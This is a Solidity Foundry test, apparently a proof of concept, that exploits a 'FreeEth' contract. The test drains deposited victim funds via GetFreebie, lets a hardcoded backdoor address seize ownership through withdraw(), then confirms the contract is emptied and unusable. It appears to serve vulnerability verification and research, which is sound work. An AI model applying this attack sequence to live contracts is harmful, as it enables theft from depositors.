// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol";

contract FreeEthExploitTest is Test {
    FreeEth freeEth;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address backdoorUser = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(victim, 5 ether);
        vm.deal(attacker, 1.1 ether);
        vm.deal(backdoorUser, 1 ether);

        vm.prank(owner);
        freeEth = new FreeEth();
    }

    function test_DenialOfService() public {
        // Normal user deposits funds
        vm.prank(victim);
        (bool success,) = address(freeEth).call{value: 5 ether}("");
        require(success, "Victim deposit failed");
        
        console2.log("--- BEFORE-Trigger State ---");
        // Record pre-attack state
        uint256 preBalance = address(freeEth).balance;
        address preOwner = freeEth.Owner();
        uint256 preTotalFreebies = freeEth.totalFreebies();
        uint256 preTotalWithdrawals = freeEth.totalWithdrawals();
        
        console2.log("Contract balance (pre):", preBalance);
        console2.log("Contract owner (pre):", preOwner);
        console2.log("totalFreebies (pre):", preTotalFreebies);
        console2.log("totalWithdrawals (pre):", preTotalWithdrawals);

        console2.log("--- Trigger Exploit ---");
        // Attacker triggers GetFreebie to drain funds to owner
        vm.prank(attacker);
        freeEth.GetFreebie{value: 1.1 ether}();
        
        // Backdoor user triggers ownership takeover
        vm.prank(backdoorUser);
        freeEth.withdraw();
        
        console2.log("--- AFTER-Trigger State ---");
        // Record post-attack state
        uint256 postBalance = address(freeEth).balance;
        address postOwner = freeEth.Owner();
        uint256 postTotalFreebies = freeEth.totalFreebies();
        uint256 postTotalWithdrawals = freeEth.totalWithdrawals();
        
        console2.log("Contract balance (post):", postBalance);
        console2.log("Contract owner (post):", postOwner);
        console2.log("totalFreebies (post):", postTotalFreebies);
        console2.log("totalWithdrawals (post):", postTotalWithdrawals);

        // Compare state differences
        console2.log("--- STATE CHANGES ---");
        console2.log("Balance changed?", postBalance != preBalance ? "YES" : "NO");
        console2.log("Owner changed?", postOwner != preOwner ? "YES" : "NO");
        console2.log("Owner set to backdoor?", postOwner == backdoorUser ? "YES" : "NO");
        console2.log("Freebies changed?", postTotalFreebies != preTotalFreebies ? "YES" : "NO");
        console2.log("Withdrawals changed?", postTotalWithdrawals != preTotalWithdrawals ? "YES" : "NO");
        
        // Verify contract drained to owner
        assertEq(address(freeEth).balance, 0, "Contract not drained");

        // Original owner cannot withdraw funds
        vm.prank(owner);
        (bool withdrawSuccess,) = address(freeEth).call(abi.encodeWithSignature("withdraw()"));
        require(!withdrawSuccess, "Owner withdrawal should revert");
        
        // Contract functionality denied for all users
        vm.prank(victim);
        (bool freebieSuccess,) = address(freeEth).call{value: 1.1 ether}(
            abi.encodeWithSignature("GetFreebie()")
        );
        require(!freebieSuccess, "GetFreebie should be unusable");

        // Final vulnerability verdict
        if (postOwner == backdoorUser && postBalance == 0) {
            console2.log("Vulnerability Exists: Attack succeeded (ownership changed and contract drained)");
        } else {
            console2.log("Vulnerability not Exist: Attack did not alter state as expected");
        }
    }
}